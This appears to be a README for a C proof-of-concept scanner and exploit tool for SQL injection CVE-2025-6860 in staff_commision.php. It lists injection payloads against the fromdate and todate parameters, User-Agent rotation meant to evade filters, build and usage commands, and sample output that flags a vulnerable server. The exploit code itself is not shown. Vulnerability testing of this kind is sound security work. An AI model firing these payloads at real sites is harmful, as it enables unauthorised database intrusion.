# CVE-2025-6860 Exploit Tool

A proof‑of‑concept command‑line tool in C for detecting (and rudimentary exploiting) the SQL injection vulnerability **CVE‑2025‑6860** in `staff_commision.php` (parameters `fromdate` & `todate`). Leverages **libcurl** for HTTP requests, rotates through common payloads & user‑agents, scans responses for SQL error patterns, and emits colorful, syscall‑driven console output.

##  Features

- **Automatic payload rotation**  
  Tries a variety of SQL injection payloads (`' OR 1 -- -`, `admin' or '1'='1`, `-1 UNION SELECT 1`, …) against both `fromdate` and `todate`.

- **Dynamic User‑Agent cycling**  
  Rotates through a list of realistic browser UA strings to evade simple filters.

- **Libcurl‑powered HTTP**  
  Follows redirects, disables SSL verification (for testing), custom headers.

- **Low‑level syscalls for I/O**  
  Uses `syscall(write)` instead of `printf()` for colored & timely messaging.

- **Response analysis**  
  Scans server replies for 50+ SQL error signatures (MySQL, PostgreSQL, Oracle, MSSQL, OLE‑DB, ODBC, Hibernate, etc.).

- **ANSI‑colored output**  
  Clear success / failure / informational messages in green, blue, red.


##  Prerequisites

- **gcc** (or any recent C compiler with Linux x86_64 support)
- **libcurl** development headers
- **argparse.c/h** (bundled in this repo)

On Debian/Ubuntu:
sudo apt update
sudo apt install -y build-essential libcurl4-openssl-dev

## Build : 
gcc exploit.c argparse.c -o exploit -lcurl

## Usage :
./exploit -u "http://target.com/panel/staff_commision.php?fromdate=&todate="
-u, --url
Target URL template, include the base path and empty parameters.

Example :
./exploit -u "http://vulnweb.com/panel/staff_commision.php?fromdate=&todate="
If vulnerable, you’ll see:

[+] Exploitation of CVE-2025-6860 has begun...
[+] TARGET URL   : http://…?fromdate=&todate=
[+] Request sent successfully!
[+] FULL URL     : http://…?fromdate=' OR 1 -- -&todate=' OR 1 -- -
[+] HTTP CODE    : 200
[+] A suspicious word was found in response!
[+] Keyword      : You have an error in your SQL syntax
[+] The server suffers from a CVE-2025-6860 vulnerability!
On failure, it reports missing patterns or HTTP errors.

📂 File Structure :
├── exploit.c       # Main exploit logic
├── argparse.c      # Minimal argparse implementation
├── argparse.h      # Header for argparse.c
├── README.md       # This documentation
└── LICENSE         # MIT License file
📝 Contribute :
Fork the repo

Add payloads / error patterns / advanced extraction features

Disclaimer: Use this tool only on systems you own or have explicit permission to test. Unauthorized scanning or exploitation is illegal.

